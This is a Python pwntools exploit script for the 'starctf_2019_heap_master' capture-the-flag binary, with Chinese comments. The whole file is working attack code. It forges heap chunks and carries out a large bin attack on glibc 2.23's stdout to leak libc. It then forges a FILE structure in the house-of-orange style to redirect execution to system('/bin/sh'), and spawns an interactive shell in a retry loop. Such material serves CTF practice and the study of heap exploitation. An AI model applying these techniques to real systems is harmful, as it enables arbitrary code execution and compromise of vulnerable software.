#coding:utf8
from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
_IO_2_1_stdout_s = libc.sym['_IO_2_1_stdout_']

def add(size):
   sh.sendlineafter('>>','1')
   sh.sendlineafter('size:',str(size))

def edit(offset,size,content):
   sh.sendlineafter('>>','2')
   sh.sendlineafter('offset:',str(offset))
   sh.sendlineafter('size:',str(size))
   sh.sendafter('content:',content)


def delete(offset):
   sh.sendlineafter('>>','3')
   sh.sendlineafter('offset:',str(offset))

def exploit():
   #伪造8个chunk
   #0
   edit(0,0x100,p64(0) + p64(0x421) + 'a'*0xF0)
   #1
   edit(0x420,0x20,p64(0) + p64(0x21) + 'b'*0x10)
   #2
   edit(0x440,0x20,p64(0) + p64(0x21) + 'b'*0x10)
   #3
   edit(0x880,0x100,p64(0) + p64(0x431) + 'c'*0xF0)
   #4
   edit(0xCB0,0x20,p64(0) + p64(0x21) + 'd'*0x10)
   #5
   edit(0xCD0,0x90,p64(0) + p64(0x91) + 'e'*0x80)
   #6
   edit(0xD60,0x20,p64(0) + p64(0x21) + 'f'*0x10)
   #7
   edit(0xD80,0x20,p64(0) + p64(0x21) + 'g'*0x10)

   #0进入unsored bin
   delete(0x10)
   #malloc_consolidate将0放入large bin
   add(0x430)
   #接下来，为了在bk和bk_nextsize处都有libc指针，我们要继续伪造unsorted bin
   #在bk_nextsize处留下libc指针
   edit(0x10,0xF0,p64(0) + p64(0x91) + 'a'*0x80 + (p64(0) + p64(0x21) + 'a'*0x10) * 3)
   delete(0x20)
   add(0x80) #把unsorted bin申请掉
   #在bk留下libc指针
   edit(0,0x10,p64(0) + p64(0xC1))
   delete(0x10)
   add(0xB0) #把unsorted bin申请掉
   #修改large bin的bk，指向stdout
   edit(0x10,0xA,p64(0) + p16((0x2 << 12) + ((_IO_2_1_stdout_s - 0x10) & 0xFFF)))
   #修改large bin的bk_nextsize
   edit(0x20,0xA,p64(0) + p16((0x2 << 12) + ((_IO_2_1_stdout_s + 0x20 - 0x20 - 0x7) & 0xFFF)))
   #恢复large bin的头size
   edit(0,0x10,p64(0) + p64(0x421))
   #3放入unsorted bin，3属于未归位的large bin
   delete(0x890)
   #0x90的堆放入unsorted bin
   delete(0xCE0)
   #遍历unsorted bin时发生large bin attack，攻击io_2_1_stdout
   add(0x80)
   sh.recv(1)
   sh.recv(0x18)
   libc_base = u64(sh.recv(8)) - libc.symbols['_IO_file_jumps']
   print 'libc_base=',hex(libc_base)
   if libc_base >> 40 != 0x7F:
      raise Exception('leak error')
   _IO_list_all_addr = libc_base + libc.symbols['_IO_list_all']
   system_addr = libc_base + libc.sym['system']
   binsh_addr = libc_base + libc.search('/bin/sh').next()
   _IO_str_finish_ptr_addr = libc_base + 0x3C37B0
   print '_IO_list_all_addr=',hex(_IO_list_all_addr)
   print '_IO_str_finish_ptr_addr=',hex(_IO_str_finish_ptr_addr)
   print 'system_addr=',hex(system_addr)
   print 'binsh_addr=',hex(binsh_addr)

   #house of orange
   fake_file = p64(0) + p64(0x61) #unsorted bin attack
   fake_file += p64(0) + p64(_IO_list_all_addr - 0x10)
   #_IO_write_base < _IO_write_ptr
   fake_file += p64(0) + p64(1)
   fake_file += p64(0) + p64(binsh_addr)
   fake_file = fake_file.ljust(0xC0,'\x00')
   fake_file += p64(0)*3
   fake_file += p64(_IO_str_finish_ptr_addr - 0x18) #vtable
   fake_file += p64(0)
   fake_file += p64(system_addr)
   delete(0xCE0) #unsorted bin
   edit(0xCD0,len(fake_file),fake_file) #修改unsorted bin内容
   #getshell
   add(1)

while True:
   try:
      global sh
      sh = process('./starctf_2019_heap_master')
      exploit()
      sh.interactive()
   except:
      sh.close()
      print 'trying...'

